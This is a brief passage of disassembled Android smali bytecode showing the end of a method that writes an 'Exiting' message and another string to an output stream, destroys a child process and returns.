    .restart local v23    # "pi":Ljava/io/InputStream;
    :goto_b
    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    const-string v2, "Exiting\n"

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 131
    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v4, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write([B)V

    .line 132
    invoke-virtual {v7}, Ljava/lang/Process;->destroy()V

    .line 133
    return-void
.end method
